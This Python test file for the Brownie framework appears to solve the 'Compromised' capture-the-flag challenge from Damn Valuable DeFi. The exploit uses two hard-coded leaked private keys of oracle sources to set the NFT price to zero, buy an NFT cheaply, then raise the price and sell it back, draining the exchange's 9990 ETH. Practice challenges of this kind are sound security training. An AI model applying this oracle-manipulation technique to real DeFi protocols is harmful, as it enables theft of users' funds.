import pytest
import brownie
from brownie import Exchange, DamnValuableNFT, TrustfulOracle, TrustfulOracleInitializer
from brownie import accounts , Wei , exceptions, web3


print('Compromised challenge :')

sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ]

deployer, attacker = None, None
EXCHANGE_INITIAL_ETH_BALANCE = Wei('9990 ether')
INITIAL_NFT_PRICE = Wei('999 ether')

@pytest.fixture(scope="module")
def contracts():
    #-- SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE --#
    global deployer, attacker
    deployer= accounts[0]
    attacker = accounts.add()
    
    deployer.transfer(attacker.address, Wei('0.1 ether'))
    assert attacker.balance() == Wei('0.1 ether')

    # fund the trusted source addresses
    for source in sources:
        deployer.transfer(source, Wei('2 ether'))
        assert web3.eth.get_balance(source) == Wei('2 ether')

    contracts = {}

    oracle_initializer = TrustfulOracleInitializer.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],
                {"from":deployer}
            )
    oracle = TrustfulOracle.at(oracle_initializer.oracle())

    exchange = Exchange.deploy(
            oracle.address,
            {"from":deployer, "value": EXCHANGE_INITIAL_ETH_BALANCE }
        )

    nftToken = DamnValuableNFT.at(exchange.token())

    contracts['oracle'] = oracle
    contracts['exchange'] = exchange
    contracts['nftToken'] = nftToken

    yield contracts

    # **--SUCCESS CONDITIONS--**
        
    # Exchange must have lost all ETH
    assert exchange.balance() == '0'
        
    # Attacker's ETH balance must have significantly increased
    assert attacker.balance() > EXCHANGE_INITIAL_ETH_BALANCE
    
    # Attacker must not own any NFT
    assert nftToken.balanceOf(attacker.address) == '0'

    # NFT price shouldn't have changed
    assert oracle.getMedianPrice("DVNFT") == INITIAL_NFT_PRICE

def test_compromised_challenge(contracts):
    #--*** CODE YOUR EXPLOIT HERE ***--#
    
    # Decode the source private key and load trusted source wallets
    privateKey1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
    source1 = accounts.add(privateKey1)

    privateKey2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
    source2 = accounts.add(privateKey2)

    # Update Oracle price to zero such that median price is zero
    contracts['oracle'].postPrice("DVNFT", 0, {"from":source1})
    contracts['oracle'].postPrice("DVNFT", 0, {"from":source2})

    # Buy a NFT at median price 0
    tx = contracts['exchange'].buyOne({"from":attacker, "value": 1 })
    id = tx.return_value

    # Update Oracle price to EXCHANGE_INITIAL_ETH_BALANCE  (9990 ETH)
    # such that median price is 9990 ETH
    contracts['oracle'].postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE , {"from":source1})
    contracts['oracle'].postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE , {"from":source2})

    # sell NFT for the High price set of 9990 ETH
    contracts['nftToken'].approve(contracts['exchange'].address, id, {"from":attacker}) 
    contracts['exchange'].sellOne(id, {"from":attacker})

    # Update Oracle price back to 999 ETH
    contracts['oracle'].postPrice("DVNFT", INITIAL_NFT_PRICE, {"from": source1})
    contracts['oracle'].postPrice("DVNFT", INITIAL_NFT_PRICE, {"from": source2})

    #_________________________________#

